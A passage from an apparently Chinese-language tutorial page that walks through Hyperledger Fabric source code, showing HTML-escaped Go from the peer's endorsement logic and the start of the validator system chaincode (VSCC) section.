	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessagef&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;make sure the chaincode %s has been successfully defined on channel %s and try again&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;())
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// 1 -- simulate
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;simulationResult&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulateProposal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Input&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessage&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error in simulation&amp;#34;&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;cceventBytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CreateCCEventBytes&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Wrap&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to marshal chaincode event&amp;#34;&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;prpBytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetBytesProposalResponsePayload&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalHash&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;simulationResult&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cceventBytes&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeID&lt;/span&gt;{
		&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;:    &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;Version&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;cdLedger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Version&lt;/span&gt;,
	})
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Warning&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed marshaling the proposal response payload to bytes&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessage&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to create the proposal response&amp;#34;&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// if error, capture endorsement failure metric
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{
		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;channel&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;(),
		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;,
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Status&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ERROR&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;{
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Payload&lt;/span&gt;:  &lt;span style=&#34;color:#a6e22e&#34;&gt;prpBytes&lt;/span&gt;,
		}, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;:
		&lt;span style=&#34;color:#75715e&#34;&gt;// Chaincode invocations without a channel ID is a broken concept
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// that should be removed in the future.  For now, return unendorsed
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// success.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;{
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;,
		}, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Status&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ERRORTHRESHOLD&lt;/span&gt;:
		&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt; = append(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincodeerror&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;strconv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FormatBool&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;))
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;EndorsementsFailed&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debugf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode error %d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Status&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;{
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;,
		}, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;escc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cdLedger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;EndorsementPlugin&lt;/span&gt;

	&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debugf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;escc for chaincode %s is %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;escc&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// Note, mPrpBytes is the same as prpBytes by default endorsement plugin, but others could change it.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;endorsement&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;mPrpBytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;EndorseWithPlugin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;escc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;prpBytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignedProposal&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt; = append(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincodeerror&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;strconv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FormatBool&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;))
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;EndorsementsFailed&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessage&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;endorsing with plugin failed&amp;#34;&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;{
		&lt;span style=&#34;color:#a6e22e&#34;&gt;Version&lt;/span&gt;:     &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;Endorsement&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;endorsement&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;Payload&lt;/span&gt;:     &lt;span style=&#34;color:#a6e22e&#34;&gt;mPrpBytes&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;:    &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;,
	}, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// determine whether or not a transaction simulator should be
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// obtained for a proposal.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;acquireTxSimulator&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chainID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chainID&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// ¯\_(ツ)_/¯ locking.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// Don&amp;#39;t get a simulator for the query and config system chaincode.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// These don&amp;#39;t need the simulator and its read lock results in deadlocks.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;qscc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cscc&amp;#34;&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
	}
}

&lt;span style=&#34;color:#75715e&#34;&gt;// shorttxid replicates the chaincode package function to shorten txids.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ~~TODO utilize a common shorttxid utility across packages.~~
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// TODO use a formal type for transaction ID and make it a stringer
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shorttxid&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txid&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;txid&lt;/span&gt;) &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;txid&lt;/span&gt;
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;txid&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CreateCCEventBytes&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeEvent&lt;/span&gt;) ([]&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;proto&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Marshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt;)
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decorateLogger&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;flogging&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FabricLogger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TransactionParams&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;flogging&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FabricLogger&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;channel&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;txID&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;shorttxid&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxID&lt;/span&gt;))
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;验证系统链码-validator-system-chaincode-vscc&#34;&gt;验证系统链码 (&lt;em&gt;Validator System Chaincode&lt;/em&gt;, VSCC)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;/core/committer/txvalidator/v14/vscc_validator.go&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;被记账节点(validator)调用，根据合约的背书政策验证交易的有效性和背书的正确性。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;txvalidator&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;

	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/golang/protobuf/proto&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric-protos-go/common&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric-protos-go/peer&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;commonerrors&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/common/errors&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/common/policydsl&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/core/common/ccprovider&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/core/common/sysccprovider&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;validation&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/core/handlers/validation/api&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/rwsetutil&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/protoutil&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/pkg/errors&amp;#34;&lt;/span&gt;
)

&lt;span style=&#34;color:#75715e&#34;&gt;// VsccValidatorImpl is the implementation used to call
